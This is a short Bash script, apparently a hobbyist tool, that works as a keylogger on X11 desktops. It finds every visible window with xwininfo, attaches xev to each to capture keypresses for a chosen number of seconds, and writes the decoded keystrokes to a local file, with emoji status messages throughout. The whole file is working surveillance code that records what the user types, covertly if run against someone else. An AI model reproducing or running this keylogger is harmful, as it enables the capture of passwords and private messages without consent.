#!/bin/bash

# Author: Lisandro Martinez (aka lichi)

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"


function loadingUI(){
    echo -e "${redColour}[+]${endColour} Starting keylogger \U1F92B\n"
    EraseToEOL=$(tput el)
    workTime=$((SECONDS + $1))
    while [ $SECONDS -le $workTime ]
    do
        msg='Working'
        for i in {1..5}
        do
          printf "%s" "${msg}"
          msg='.'
          sleep .2
        done
        printf "\r${EraseToEOL}"
    done
    echo -e "${redColour}[+]${endColour} Scanning completed \U1F608\n"
}

function helpPanel(){
    echo -e "${yellowColour}Usage:${endColour}"
    echo -e "\t${purpleColour}-t:${endColour} Setting the keylogger duration time"
}

function validateIsVisible(){
    cat $1 > fileWinID.tmp
    rm $1
    while read winID
    do 
      xwininfo -id $winID | grep "IsViewable" > /dev/null && echo "$winID" >> $1 
    done < fileWinID.tmp
    rm fileWinID.tmp
}

function keyLogger(){
    timeout $1 xev -event keyboard -id $2 >> auxFile.tmp &
}    

function parseInfo(){
  cat auxFile.tmp | grep KeyPress -A 4 | grep keycode | awk '{print $7}' > auxFinalMsg.tmp
  echo "" > finalMsg
  while read line
  do
    echo $line | head -c -3 |sed 's/space/ /g' >> finalMsg
  done < auxFinalMsg.tmp
  echo -e "\n" >> finalMsg
  rm auxFile.tmp auxFinalMsg.tmp
}

function getAllWinID(){
    xwininfo -root -tree > auxAllWinID.tmp
    grep -v +10+10 auxAllWinID.tmp |grep -v "has no name"| grep -o -E '0x[0-9a-z]{6,7}' > allWinID.tmp
    validateIsVisible "allWinID.tmp"
    rm auxAllWinID.tmp
}

# Main Function

if [ -z $1 ]; then helpPanel; exit 1; fi
declare -i parameter_counter=0; while getopts "ht:" arg 
do
    case $arg in
        t)
            timeoutVar=$OPTARG
            if [[ $timeoutVar =~ ^[0-9]+$ ]]
            then
                getAllWinID 
                while read winID
                do
                    keyLogger "$timeoutVar" "$winID"
                done < allWinID.tmp
                loadingUI "$(($timeoutVar + 2))"
                parseInfo
            else
                echo -e "${redColour}[+]${endColour} Sorry Integers only \U0001F62D" 1>&2
                exit 1
            fi    
            ;;
        h)
            helpPanel
            exit 0
            ;;
        *)
            helpPanel
            exit 1
            ;;
    esac
done
rm allWinID.tmp 
exit 0
